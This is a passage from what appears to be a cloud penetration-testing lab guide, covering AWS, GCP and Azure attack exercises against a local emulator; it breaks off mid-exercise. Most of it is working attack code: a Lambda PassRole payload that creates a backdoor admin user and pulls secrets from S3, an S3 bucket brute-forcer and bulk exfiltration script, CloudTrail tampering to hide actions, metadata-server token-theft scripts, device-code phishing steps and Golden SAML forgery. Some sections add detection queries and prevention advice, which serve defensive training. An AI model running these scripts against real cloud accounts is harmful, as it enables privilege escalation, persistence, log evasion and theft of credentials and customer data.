### Exercise 3: AWS Lambda Privilege Escalation via PassRole

**Objective:** Exploit `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` to execute code as an admin IAM role.

**Step 1 — Create the Lambda payload:**

```python
# scripts/lambda_payload/index.py
"""Lambda function that abuses its admin execution role."""
import json
import boto3
import os

def handler(event, context):
    """Execute privileged operations using Lambda's admin role."""
    endpoint = os.environ.get("AWS_ENDPOINT_URL", None)
    kwargs = {}
    if endpoint:
        kwargs["endpoint_url"] = endpoint

    iam = boto3.client("iam", **kwargs)
    sts = boto3.client("sts", **kwargs)

    # Confirm we're running as admin
    identity = sts.get_caller_identity()

    results = {"identity": identity}

    action = event.get("action", "recon")

    if action == "recon":
        users = iam.list_users()
        roles = iam.list_roles()
        results["users"] = [u["UserName"] for u in users["Users"]]
        results["roles"] = [r["RoleName"] for r in roles["Roles"]]

    elif action == "create_backdoor":
        # Create a backdoor admin user
        try:
            iam.create_user(UserName="lambda-backdoor")
            iam.attach_user_policy(
                UserName="lambda-backdoor",
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
            )
            keys = iam.create_access_key(UserName="lambda-backdoor")
            results["backdoor_keys"] = {
                "AccessKeyId": keys["AccessKey"]["AccessKeyId"],
                "SecretAccessKey": keys["AccessKey"]["SecretAccessKey"]
            }
        except Exception as e:
            results["error"] = str(e)

    elif action == "exfil_secrets":
        s3 = boto3.client("s3", **kwargs)
        secrets = []
        try:
            buckets = s3.list_buckets()
            for bucket in buckets["Buckets"]:
                try:
                    objects = s3.list_objects_v2(
                        Bucket=bucket["Name"], MaxKeys=5
                    )
                    for obj in objects.get("Contents", []):
                        if any(kw in obj["Key"].lower()
                               for kw in ["secret", "password", "key", ".env", "cred"]):
                            body = s3.get_object(
                                Bucket=bucket["Name"], Key=obj["Key"]
                            )["Body"].read().decode()
                            secrets.append({
                                "bucket": bucket["Name"],
                                "key": obj["Key"],
                                "content": body[:500]
                            })
                except Exception:
                    continue
        except Exception as e:
            results["error"] = str(e)
        results["secrets_found"] = secrets

    return {
        "statusCode": 200,
        "body": json.dumps(results, default=str)
    }
```

**Step 2 — Package and deploy the Lambda:**

```bash
# Create deployment package
cd /opt/scripts/lambda_payload
zip -j /tmp/payload.zip index.py

# Create the Lambda function with the admin execution role
aws lambda create-function \
  --function-name privesc-func \
  --runtime python3.12 \
  --role arn:aws:iam::000000000000:role/LambdaAdminRole \
  --handler index.handler \
  --zip-file fileb:///tmp/payload.zip \
  --timeout 60 \
  --environment '{"Variables":{"AWS_ENDPOINT_URL":"http://localstack:4566"}}' \
  --endpoint-url http://localhost:4566
```

**Step 3 — Invoke for reconnaissance:**

```bash
# Recon: enumerate users and roles
aws lambda invoke \
  --function-name privesc-func \
  --payload '{"action": "recon"}' \
  /dev/stdout \
  --endpoint-url http://localhost:4566 | jq '.body | fromjson'
```

**Step 4 — Invoke to create a backdoor admin user:**

```bash
# Create persistent backdoor
aws lambda invoke \
  --function-name privesc-func \
  --payload '{"action": "create_backdoor"}' \
  /dev/stdout \
  --endpoint-url http://localhost:4566 | jq '.body | fromjson'

# Save the backdoor credentials and verify access
aws iam list-users --endpoint-url http://localhost:4566
```

**Step 5 — Invoke to exfiltrate secrets:**

```bash
aws lambda invoke \
  --function-name privesc-func \
  --payload '{"action": "exfil_secrets"}' \
  /dev/stdout \
  --endpoint-url http://localhost:4566 | jq '.body | fromjson'
```

**Verification:** The Lambda function runs as `LambdaAdminRole`, creates a backdoor user with admin access, and retrieves secrets from S3 — all through a function created by a low-privilege user who only needed `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`.

---

### Exercise 4: AWS STS Token Abuse and Role Chaining

**Objective:** Exploit transitive role-assumption chains to reach a high-privilege role through intermediate roles. Demonstrate `AssumeRole` chaining and token reuse.

**Step 1 — Enumerate assumable roles:**

```bash
# List all roles and inspect their trust policies
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' \
  --output table --endpoint-url http://localhost:4566

# Check trust policy for AdminRole
aws iam get-role --role-name AdminRole \
  --query 'Role.AssumeRolePolicyDocument' \
  --endpoint-url http://localhost:4566
# Expected: Principal: "*" — any account can assume this role
```

**Step 2 — Assume the admin role directly (wildcard trust policy):**

```bash
# Assume AdminRole using attacker credentials
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/AdminRole \
  --role-session-name attacker-session \
  --endpoint-url http://localhost:4566)

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')

# Verify admin identity
aws sts get-caller-identity --endpoint-url http://localhost:4566
```

**Step 3 — Automated role-chain scanner:**

```python
#!/usr/bin/env python3
"""
scripts/role_chain_scanner.py
Maps role assumption chains and identifies transitive escalation paths.
"""
import boto3
import json
from collections import defaultdict
from typing import Optional


class RoleChainScanner:
    def __init__(self, endpoint_url: Optional[str] = None):
        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url
        self.iam = boto3.client("iam", **kwargs)
        self.sts = boto3.client("sts", **kwargs)

    def build_trust_graph(self) -> dict:
        """Build a graph of role trust relationships."""
        graph = defaultdict(list)
        roles = self.iam.list_roles()["Roles"]

        for role in roles:
            role_arn = role["Arn"]
            role_name = role["RoleName"]
            trust = role.get("AssumeRolePolicyDocument", {})
            if isinstance(trust, str):
                trust = json.loads(trust)

            for stmt in trust.get("Statement", []):
                if stmt.get("Effect") != "Allow":
                    continue
                principal = stmt.get("Principal", {})
                conditions = stmt.get("Condition", {})
                has_external_id = "StringEquals" in conditions and \
                    "sts:ExternalId" in conditions.get("StringEquals", {})

                if principal == "*" or principal == {"AWS": "*"}:
                    graph["*"].append({
                        "target": role_arn,
                        "role_name": role_name,
                        "has_external_id": has_external_id,
                        "risk": "CRITICAL" if not has_external_id else "LOW"
                    })
                elif isinstance(principal, dict):
                    for key, val in principal.items():
                        vals = [val] if isinstance(val, str) else val
                        for v in vals:
                            graph[v].append({
                                "target": role_arn,
                                "role_name": role_name,
                                "has_external_id": has_external_id,
                                "trust_type": key
                            })

        return dict(graph)

    def find_chains(self, start_arn: str, graph: dict, max_depth: int = 5) -> list:
        """Find all role assumption chains from a starting principal."""
        chains = []

        def dfs(current, path, depth):
            if depth > max_depth:
                return
            # Check if current principal can assume any roles
            for principal_pattern, targets in graph.items():
                if self._matches_principal(current, principal_pattern):
                    for target in targets:
                        target_arn = target["target"]
                        if target_arn not in [p["arn"] for p in path]:
                            new_path = path + [{
                                "arn": target_arn,
                                "role": target["role_name"],
                                "via": principal_pattern
                            }]
                            chains.append(new_path)
                            dfs(target_arn, new_path, depth + 1)

        dfs(start_arn, [], 0)
        return chains

    def _matches_principal(self, arn: str, pattern: str) -> bool:
        if pattern == "*":
            return True
        if pattern == arn:
            return True
        if pattern.endswith(":root"):
            account = pattern.split(":")[4]
            return f":{account}:" in arn
        return False

    def get_role_permissions(self, role_name: str) -> list:
        """Get effective permissions for a role."""
        permissions = []
        try:
            # Inline policies
            inline = self.iam.list_role_policies(RoleName=role_name)
            for pname in inline.get("PolicyNames", []):
                doc = self.iam.get_role_policy(
                    RoleName=role_name, PolicyName=pname
                )["PolicyDocument"]
                for stmt in doc.get("Statement", []):
                    if stmt.get("Effect") == "Allow":
                        actions = stmt.get("Action", [])
                        if isinstance(actions, str):
                            actions = [actions]
                        permissions.extend(actions)
            # Attached policies
            attached = self.iam.list_attached_role_policies(RoleName=role_name)
            for policy in attached.get("AttachedPolicies", []):
                if "AdministratorAccess" in policy["PolicyArn"]:
                    permissions.append("*:* (AdministratorAccess)")
        except Exception:
            pass
        return permissions

    def scan(self) -> dict:
        """Full role-chain analysis."""
        identity = self.sts.get_caller_identity()
        graph = self.build_trust_graph()
        chains = self.find_chains(identity["Arn"], graph)

        # Annotate chains with target permissions
        annotated_chains = []
        for chain in chains:
            final_role = chain[-1]["role"]
            perms = self.get_role_permissions(final_role)
            annotated_chains.append({
                "chain": chain,
                "final_role": final_role,
                "final_permissions": perms,
                "is_admin": any("*" in p for p in perms),
                "chain_length": len(chain)
            })

        return {
            "caller": identity,
            "trust_graph": graph,
            "chains_found": len(annotated_chains),
            "admin_chains": [c for c in annotated_chains if c["is_admin"]],
            "all_chains": annotated_chains
        }


if __name__ == "__main__":
    import sys
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4566"
    scanner = RoleChainScanner(endpoint_url=endpoint)
    results = scanner.scan()
    print(json.dumps(results, indent=2, default=str))
```

**Verification:** The scanner identifies that the wildcard trust policy on `AdminRole` allows direct assumption from any principal, providing immediate admin access.

---

### Exercise 5: S3 Bucket Enumeration, Public Bucket Discovery, and EBS Snapshot Exfiltration

**Objective:** Discover misconfigured S3 buckets, exploit public access policies, and demonstrate EBS snapshot exfiltration.

**Step 1 — Brute-force S3 bucket names:**

```bash
#!/bin/bash
# scripts/s3_enum.sh
# S3 bucket enumeration via predictable naming patterns

TARGET="company"
ENDPOINT="http://localhost:4566"

SUFFIXES=(
  "data-prod" "data-dev" "data-staging"
  "backup" "backup-2024" "backup-2025"
  "logs" "logs-internal" "logs-archive"
  "assets" "public-assets" "static"
  "customer-pii" "customer-data"
  "configs" "terraform-state"
  "ml-models" "analytics"
)

echo "[*] Enumerating S3 buckets for target: $TARGET"
for suffix in "${SUFFIXES[@]}"; do
  BUCKET="${TARGET}-${suffix}"
  # Try unauthenticated listing
  RESULT=$(aws s3 ls "s3://${BUCKET}" --no-sign-request \
    --endpoint-url "$ENDPOINT" 2>&1)
  if [[ $? -eq 0 ]]; then
    echo "[PUBLIC] $BUCKET — unauthenticated access!"
    echo "  Objects:"
    echo "$RESULT" | head -10
  else
    # Try authenticated listing
    RESULT=$(aws s3 ls "s3://${BUCKET}" --endpoint-url "$ENDPOINT" 2>&1)
    if [[ $? -eq 0 ]]; then
      echo "[AUTH]   $BUCKET — accessible with current credentials"
    fi
  fi
done

echo ""
echo "[*] Checking bucket policies..."
for bucket in $(aws s3 ls --endpoint-url "$ENDPOINT" 2>/dev/null | awk '{print $3}'); do
  POLICY=$(aws s3api get-bucket-policy --bucket "$bucket" \
    --endpoint-url "$ENDPOINT" 2>/dev/null)
  if echo "$POLICY" | grep -q '"Principal":"*"' 2>/dev/null; then
    echo "[!] $bucket has wildcard principal in policy — PUBLIC!"
  fi
  ACL=$(aws s3api get-bucket-acl --bucket "$bucket" \
    --endpoint-url "$ENDPOINT" 2>/dev/null)
  if echo "$ACL" | grep -q "AllUsers\|AuthenticatedUsers" 2>/dev/null; then
    echo "[!] $bucket has public ACL!"
  fi
done
```

**Step 2 — Bulk data exfiltration:**

```python
#!/usr/bin/env python3
"""
scripts/s3_exfil.py
Targeted S3 data exfiltration with keyword-based file discovery.
"""
import boto3
import json
import os
from pathlib import Path


SENSITIVE_PATTERNS = [
    "secret", "password", "credential", "key", ".env",
    "config", "token", "private", "backup", "dump",
    "ssn", "pii", "customer", "financial", "credit"
]


class S3Exfiltrator:
    def __init__(self, endpoint_url=None):
        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url
        self.s3 = boto3.client("s3", **kwargs)

    def list_all_buckets(self) -> list:
        return self.s3.list_buckets().get("Buckets", [])

    def find_sensitive_objects(self, bucket: str, max_keys: int = 1000) -> list:
        """Find objects with sensitive-looking names."""
        sensitive = []
        paginator = self.s3.get_paginator("list_objects_v2")
        page_iter = paginator.paginate(Bucket=bucket, PaginationConfig={"MaxItems": max_keys})
        for page in page_iter:
            for obj in page.get("Contents", []):
                key_lower = obj["Key"].lower()
                for pattern in SENSITIVE_PATTERNS:
                    if pattern in key_lower:
                        sensitive.append({
                            "bucket": bucket,
                            "key": obj["Key"],
                            "size": obj["Size"],
                            "last_modified": str(obj["LastModified"]),
                            "matched_pattern": pattern
                        })
                        break
        return sensitive

    def download_object(self, bucket: str, key: str, dest_dir: str) -> str:
        """Download a single object."""
        dest_path = os.path.join(dest_dir, bucket, key)
        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
        self.s3.download_file(bucket, key, dest_path)
        return dest_path

    def exfiltrate_sensitive(self, dest_dir: str = "/tmp/exfil") -> dict:
        """Find and download all sensitive-looking objects."""
        results = {"buckets_scanned": 0, "files_found": 0, "files_downloaded": []}
        for bucket in self.list_all_buckets():
            name = bucket["Name"]
            results["buckets_scanned"] += 1
            sensitive = self.find_sensitive_objects(name)
            for obj in sensitive:
                results["files_found"] += 1
                try:
                    path = self.download_object(name, obj["key"], dest_dir)
                    results["files_downloaded"].append({
                        "source": f"s3://{name}/{obj['key']}",
                        "local_path": path,
                        "size": obj["size"],
                        "pattern": obj["matched_pattern"]
                    })
                except Exception as e:
                    results.setdefault("errors", []).append({
                        "source": f"s3://{name}/{obj['key']}",
                        "error": str(e)
                    })
        return results


if __name__ == "__main__":
    import sys
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4566"
    exfil = S3Exfiltrator(endpoint_url=endpoint)
    results = exfil.exfiltrate_sensitive()
    print(json.dumps(results, indent=2))
```

**Verification:** The scripts discover all lab buckets, identify the public `company-public-assets` bucket, and exfiltrate secrets from `company-backup-2024` and PII from `company-customer-pii`.

---

### Exercise 6: CloudTrail Evasion and Log Tampering

**Objective:** Demonstrate techniques attackers use to evade or disable CloudTrail logging, and understand blind spots in default CloudTrail configurations.

**Step 1 — Identify current logging configuration:**

```bash
# List all trails
aws cloudtrail describe-trails --endpoint-url http://localhost:4566

# Check trail status
aws cloudtrail get-trail-status --name lab-trail \
  --endpoint-url http://localhost:4566

# Check event selectors (which events are being logged)
aws cloudtrail get-event-selectors --trail-name lab-trail \
  --endpoint-url http://localhost:4566
```

**Step 2 — Evasion technique: disable logging:**

```bash
# Stop logging (this action itself IS logged)
aws cloudtrail stop-logging --name lab-trail \
  --endpoint-url http://localhost:4566

# Perform actions while logging is disabled
aws iam create-user --user-name stealth-backdoor \
  --endpoint-url http://localhost:4566
aws iam create-access-key --user-name stealth-backdoor \
  --endpoint-url http://localhost:4566

# Re-enable logging to cover tracks
aws cloudtrail start-logging --name lab-trail \
  --endpoint-url http://localhost:4566
```

**Step 3 — Evasion technique: modify event selectors:**

```bash
# Reduce logging to WriteOnly (hides all read operations)
aws cloudtrail put-event-selectors --trail-name lab-trail \
  --event-selectors '[{
    "ReadWriteType": "WriteOnly",
    "IncludeManagementEvents": true
  }]' \
  --endpoint-url http://localhost:4566

# Now read operations are invisible:
aws s3 ls --endpoint-url http://localhost:4566            # Not logged
aws iam list-users --endpoint-url http://localhost:4566    # Not logged
aws s3 cp s3://company-customer-pii/records/customer_001.json - \
  --endpoint-url http://localhost:4566                      # Not logged
```

**Step 4 — Evasion technique: operate in non-logging services and regions:**

```bash
# Some services have data-plane operations not logged by default
# S3 GetObject requires data events to be explicitly enabled
# Lambda Invoke requires data events to be explicitly enabled

# Create resources in regions where no trail exists
# (organization trails mitigate this)
```

**Verification:** Demonstrate that the `StopLogging` event is captured in the trail's last events, but actions performed during the gap have no CloudTrail record.

---

### Exercise 7: GCP Service Account Impersonation and Metadata Exploitation

**Objective:** Exploit GCP IAM service account impersonation chains and metadata server credential theft. Uses simulated GCP API endpoints.

**Step 1 — GCP metadata server exploitation script:**

```python
#!/usr/bin/env python3
"""
scripts/gcp_metadata_exploit.py
GCP metadata server exploitation — simulates credential theft
from a compromised Compute Engine instance or via SSRF.
"""
import json
import httpx

GCP_METADATA_BASE = "http://metadata.google.internal/computeMetadata/v1"
GCP_METADATA_HEADER = {"Metadata-Flavor": "Google"}

GCP_METADATA_PATHS = [
    "/project/project-id",
    "/project/numeric-project-id",
    "/project/attributes/",
    "/instance/hostname",
    "/instance/id",
    "/instance/zone",
    "/instance/machine-type",
    "/instance/network-interfaces/",
    "/instance/service-accounts/",
    "/instance/service-accounts/default/email",
    "/instance/service-accounts/default/token",
    "/instance/service-accounts/default/scopes",
    "/instance/attributes/",
    "/instance/attributes/ssh-keys",
    "/instance/attributes/startup-script",
    "/instance/attributes/kube-env",  # GKE node — kubelet creds
]


class GCPMetadataExploit:
    def __init__(self, metadata_url: str = GCP_METADATA_BASE):
        self.base_url = metadata_url
        self.client = httpx.Client(timeout=10)

    def fetch(self, path: str, recursive: bool = False) -> str:
        """Fetch metadata endpoint."""
        url = f"{self.base_url}{path}"
        if recursive:
            url += "?recursive=true"
        try:
            resp = self.client.get(url, headers=GCP_METADATA_HEADER)
            if resp.status_code == 200:
                return resp.text
        except Exception:
            pass
        return ""

    def steal_access_token(self) -> dict:
        """Steal the default service account's access token."""
        token_raw = self.fetch("/instance/service-accounts/default/token")
        if token_raw:
            try:
                return json.loads(token_raw)
            except json.JSONDecodeError:
                return {"raw": token_raw}
        return {"error": "No token available"}

    def enumerate_metadata(self) -> dict:
        """Full metadata enumeration."""
        results = {}
        for path in GCP_METADATA_PATHS:
            data = self.fetch(path)
            if data:
                results[path] = data
        # Try recursive project attributes (may contain secrets in startup scripts)
        project_attrs = self.fetch("/project/attributes/", recursive=True)
        if project_attrs:
            results["project_attributes_recursive"] = project_attrs
        return results

    def check_kube_env(self) -> dict:
        """Check for GKE kube-env metadata (kubelet bootstrap creds)."""
        kube_env = self.fetch("/instance/attributes/kube-env")
        if kube_env:
            # Parse kube-env for certificate and token data
            sensitive_keys = {}
            for line in kube_env.split("\n"):
                if ":" in line:
                    key, _, val = line.partition(":")
                    key = key.strip()
                    if any(k in key.lower() for k in ["cert", "token", "key", "ca"]):
                        sensitive_keys[key] = val.strip()[:100] + "..."
            return {
                "kube_env_found": True,
                "sensitive_fields": sensitive_keys,
                "note": "kube-env contains kubelet bootstrap credentials"
            }
        return {"kube_env_found": False}


class GCPServiceAccountChainExploit:
    """Exploit service account impersonation chains in GCP."""

    def __init__(self):
        self.impersonation_chains = []

    def simulate_impersonation_chain(self) -> dict:
        """
        Simulate the GCP service account impersonation chain:
        low-priv SA → getAccessToken on high-priv SA → project owner
        """
        chain = {
            "step_1": {
                "description": "Compromised workload runs as low-priv service account",
                "command": "gcloud auth print-access-token",
                "sa": "web-app-sa@project.iam.gserviceaccount.com",
                "permissions": ["compute.instances.list", "iam.serviceAccounts.getAccessToken"]
            },
            "step_2": {
                "description": "Impersonate high-privilege service account",
                "command": "gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com",
                "sa": "admin-sa@project.iam.gserviceaccount.com",
                "permissions": ["roles/owner"]
            },
            "step_3": {
                "description": "Use impersonated token for full project access",
                "commands": [
                    "gcloud projects get-iam-policy <project>",
                    "gcloud compute instances list",
                    "gcloud storage ls",
                    "gcloud iam service-accounts keys create key.json --iam-account=admin-sa@project.iam.gserviceaccount.com"
                ]
            }
        }
        return chain

    def enumerate_impersonation_bindings(self) -> dict:
        """
        Commands to enumerate which SAs can impersonate which.
        Run these against a real GCP project.
        """
        return {
            "commands": [
                "gcloud projects get-iam-policy <project> --format=json | "
                "jq '.bindings[] | select(.role | contains(\"serviceAccountTokenCreator\") or contains(\"serviceAccountUser\"))'",
                "gcloud iam service-accounts list --format='table(email,displayName)'",
                "gcloud logging read 'protoPayload.methodName=\"GenerateAccessToken\"' --freshness=7d",
            ],
            "detection": {
                "log_filter": 'protoPayload.methodName="GenerateAccessToken" OR '
                              'protoPayload.methodName="GenerateIdToken" OR '
                              'protoPayload.methodName="SignBlob"',
                "note": "Monitor for unexpected impersonation events"
            }
        }


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--chain":
        chain = GCPServiceAccountChainExploit()
        print(json.dumps(chain.simulate_impersonation_chain(), indent=2))
        print("\n--- Enumeration Commands ---")
        print(json.dumps(chain.enumerate_impersonation_bindings(), indent=2))
    else:
        exploit = GCPMetadataExploit()
        results = exploit.enumerate_metadata()
        print(json.dumps(results, indent=2))
```

**Verification:** The script demonstrates the metadata theft path and impersonation chain. In a real GCP sandbox, the commands retrieve actual service account tokens.

---

### Exercise 8: Azure Entra ID Attack Paths — Consent Abuse and PRT Theft

**Objective:** Simulate Azure AD (Entra ID) attack vectors: illicit consent grants, service principal key abuse, and Primary Refresh Token theft. Uses simulated endpoints and real Azure CLI commands.

**Step 1 — Azure IMDS token theft simulation:**

```python
#!/usr/bin/env python3
"""
scripts/azure_imds_exploit.py
Azure Instance Metadata Service token theft.
"""
import json
import httpx

AZURE_IMDS_BASE = "http://169.254.169.254/metadata"
AZURE_IMDS_HEADER = {"Metadata": "true"}

AZURE_RESOURCES = [
    "https://management.azure.com/",
    "https://graph.microsoft.com/",
    "https://vault.azure.net/",
    "https://storage.azure.com/",
    "https://database.windows.net/",
]


class AzureIMDSExploit:
    def __init__(self, imds_url: str = AZURE_IMDS_BASE):
        self.base_url = imds_url
        self.client = httpx.Client(timeout=10)

    def fetch_token(self, resource: str) -> dict:
        """Fetch managed identity token for a specific resource."""
        url = f"{self.base_url}/identity/oauth2/token"
        params = {
            "api-version": "2018-02-01",
            "resource": resource
        }
        try:
            resp = self.client.get(url, headers=AZURE_IMDS_HEADER, params=params)
            if resp.status_code == 200:
                return resp.json()
        except Exception as e:
            return {"error": str(e)}
        return {"error": "Token not available"}

    def enumerate_instance(self) -> dict:
        """Enumerate instance metadata."""
        url = f"{self.base_url}/instance"
        params = {"api-version": "2021-02-01"}
        try:
            resp = self.client.get(url, headers=AZURE_IMDS_HEADER, params=params)
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return {}

    def steal_all_tokens(self) -> dict:
        """Attempt to steal tokens for all common Azure resources."""
        tokens = {}
        for resource in AZURE_RESOURCES:
            token = self.fetch_token(resource)
            if "access_token" in token:
                tokens[resource] = {
                    "token_type": token.get("token_type"),
                    "expires_in": token.get("expires_in"),
                    "access_token": token["access_token"][:50] + "...",
                    "resource": token.get("resource")
                }
        return tokens

    def full_exploit(self) -> dict:
        """Complete Azure IMDS exploitation."""
        return {
            "instance_metadata": self.enumerate_instance(),
            "stolen_tokens": self.steal_all_tokens()
        }


class AzureADAttackSimulator:
    """Simulate Azure AD / Entra ID attack paths."""

    def illicit_consent_grant(self) -> dict:
        """Simulate an illicit consent grant attack."""
        return {
            "description": "Attacker creates malicious multi-tenant app "
                          "requesting broad permissions, tricks admin into consenting",
            "attack_steps": [
                {
                    "step": 1,
                    "action": "Register malicious app in attacker tenant",
                    "command": "az ad app create --display-name 'Productivity Helper' "
                              "--required-resource-accesses @permissions.json "
                              "--sign-in-audience AzureADMultipleOrgs"
                },
                {
                    "step": 2,
                    "action": "Craft consent URL with broad permissions",
                    "url_template": "https://login.microsoftonline.com/{tenant}/adminconsent"
                                   "?client_id={app_id}"
                                   "&redirect_uri={attacker_callback}"
                                   "&scope=https://graph.microsoft.com/.default"
                },
                {
                    "step": 3,
                    "action": "After consent, access victim's data via Graph API",
                    "commands": [
                        "az rest --method GET --uri 'https://graph.microsoft.com/v1.0/users'",
                        "az rest --method GET --uri 'https://graph.microsoft.com/v1.0/me/messages'",
                        "az rest --method GET --uri 'https://graph.microsoft.com/v1.0/me/drive/root/children'",
                    ]
                }
            ],
            "permissions_requested": {
                "Mail.Read": "Read all user emails",
                "Files.ReadWrite.All": "Read/write all files",
                "User.Read.All": "Read all user profiles",
                "Directory.ReadWrite.All": "Modify directory objects"
            }
        }

    def service_principal_key_abuse(self) -> dict:
        """Service principal credential backdoor."""
        return {
            "description": "Add credentials to existing service principal for persistence",
            "prerequisite": "Application.ReadWrite.All or Owner on app registration",
            "commands": [
                "az ad app list --query '[].{Name:displayName,AppId:appId}' --output table",
                "az ad app credential reset --id <APP_ID> --append",
                "az login --service-principal --username <APP_ID> --password <SECRET> --tenant <TENANT_ID>",
            ],
            "detection_kql": (
                "AuditLogs\n"
                "| where OperationName == 'Add service principal credentials'\n"
                "| project TimeGenerated, InitiatedBy.user.userPrincipalName, "
                "TargetResources[0].displayName, Result"
            )
        }

    def device_code_phishing(self) -> dict:
        """Device code phishing attack."""
        return {
            "description": "Abuse OAuth device code flow to steal user tokens",
            "attack_steps": [
                {
                    "step": 1,
                    "action": "Generate device code",
                    "command": "curl -X POST 'https://login.microsoftonline.com/common/oauth2/devicecode' "
                              "-d 'client_id=<APP_ID>&resource=https://graph.microsoft.com'"
                },
                {
                    "step": 2,
                    "action": "Send device code to victim via phishing email",
                    "note": "Victim enters code at https://microsoft.com/devicelogin"
                },
                {
                    "step": 3,
                    "action": "Attacker receives tokens after victim authenticates",
                    "command": "curl -X POST 'https://login.microsoftonline.com/common/oauth2/token' "
                              "-d 'grant_type=urn:ietf:params:oauth:grant-type:device_code"
                              "&client_id=<APP_ID>&device_code=<DEVICE_CODE>'"
                }
            ],
            "detection_kql": (
                "SigninLogs\n"
                "| where AuthenticationProtocol == 'deviceCode'\n"
                "| project TimeGenerated, UserPrincipalName, IPAddress, "
                "DeviceDetail, RiskState"
            )
        }


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--ad-attacks":
        sim = AzureADAttackSimulator()
        print("=== Illicit Consent Grant ===")
        print(json.dumps(sim.illicit_consent_grant(), indent=2))
        print("\n=== Service Principal Key Abuse ===")
        print(json.dumps(sim.service_principal_key_abuse(), indent=2))
        print("\n=== Device Code Phishing ===")
        print(json.dumps(sim.device_code_phishing(), indent=2))
    else:
        exploit = AzureIMDSExploit()
        results = exploit.full_exploit()
        print(json.dumps(results, indent=2, default=str))
```

**Verification:** Scripts demonstrate Azure IMDS token theft for multiple resources (management, Graph, Key Vault, storage) and simulate Entra ID attack paths with detection KQL queries.

---

### Exercise 9: Identity Federation Attacks — Golden SAML and OIDC Abuse

**Objective:** Understand and simulate Golden SAML token forgery and OIDC trust exploitation.

```python
#!/usr/bin/env python3
"""
scripts/federation_attacks.py
Identity federation attack simulations: Golden SAML and OIDC trust abuse.
Educational demonstration only.
"""
import json
import base64
import time
import jwt  # PyJWT
from datetime import datetime, timezone, timedelta
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography import x509
from cryptography.x509.oid import NameOID


class GoldenSAMLSimulator:
    """
    Demonstrates Golden SAML attack concepts.
    In a real attack, the signing key is stolen from AD FS.
    """

    def __init__(self):
        # Generate a simulated IdP signing key
        self.private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=2048
        )
        self.certificate = self._create_self_signed_cert()

    def _create_self_signed_cert(self) -> x509.Certificate:
        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "Lab IdP Signing"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Lab Corp"),
        ])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(subject)
            .public_key(self.private_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.now(timezone.utc))
            .not_valid_after(datetime.now(timezone.utc) + timedelta(days=365))
            .sign(self.private_key, hashes.SHA256())
        )
        return cert

    def forge_saml_assertion(self, target_user: str, target_role_arn: str,
                             provider_arn: str) -> dict:
        """
        Simulate forging a SAML assertion for a target user.
        In reality, this would produce a full SAML Response XML signed
        with the stolen AD FS key.
        """
        now = datetime.now(timezone.utc)
        assertion = {
            "version": "2.0",
            "issuer": "http://lab-adfs.corp.local/adfs/services/trust",
            "issue_instant": now.isoformat(),
            "subject": {
                "name_id": target_user,
                "format": "urn:oasis:names:tc:SAML:2.0:nameid-format:persistent"
            },
            "conditions": {
                "not_before": now.isoformat(),
                "not_on_or_after": (now + timedelta(hours=1)).isoformat(),
                "audience_restriction": [
                    "urn:amazon:webservices",  # AWS
                    "urn:federation:MicrosoftOnline"  # Azure AD
                ]
            },
            "attribute_statement": {
                "https://aws.amazon.com/SAML/Attributes/Role": f"{provider_arn},{target_role_arn}",
                "https://aws.amazon.com/SAML/Attributes/RoleSessionName": target_user,
                "https://aws.amazon.com/SAML/Attributes/SessionDuration": "3600"
            },
            "signature": {
                "algorithm": "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
                "signed_with": "stolen_adfs_signing_certificate",
                "note": "Valid signature from legitimate IdP key — cloud provider accepts unconditionally"
            }
        }

        # In a real attack, this assertion would be base64-encoded and sent to:
        # AWS: aws sts assume-role-with-saml --saml-assertion <base64> --role-arn ... --principal-arn ...
        # Azure: POST to https://login.microsoftonline.com/{tenant}/saml2

        return {
            "attack": "Golden SAML",
            "forged_assertion": assertion,
            "usage_aws": f"aws sts assume-role-with-saml --role-arn {target_role_arn} "
                         f"--principal-arn {provider_arn} --saml-assertion file://forged.b64",
            "usage_azure": "POST forged assertion to Azure AD SAML endpoint",
            "stealth": "No IdP log generated — cloud provider trusts the signature directly",
            "detection": {
                "method": "Compare Azure AD sign-in logs with AD FS authentication logs",
                "indicator": "Sessions in Azure AD that have no corresponding AD FS authentication event",
                "kql": "SigninLogs | where AuthenticationProtocol == 'samlp' | "
                       "project TimeGenerated, UserPrincipalName, IPAddress, TokenIssuerName"
            },
            "prevention": [
                "Store AD FS signing certificate in HSM with non-exportable key",
                "Rotate signing certificates regularly",
                "Monitor for SAML assertion anomalies (unexpected issuer, audience, attributes)",
                "Enable Azure AD Conditional Access requiring device compliance"
            ]
        }


class OIDCTrustExploiter:
    """
    Demonstrates OIDC trust exploitation in AWS IAM roles.
    Targets CI/CD OIDC federation (e.g., GitHub Actions → AWS).
    """

    def __init__(self):
        self.private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=2048
        )

    def demonstrate_misconfigured_trust(self) -> dict:
        """Show how a misconfigured OIDC trust policy allows any identity."""
        return {
            "attack": "OIDC Trust Policy Abuse",
            "vulnerable_trust_policy": {
                "Version": "2012-10-17",
                "Statement": [{
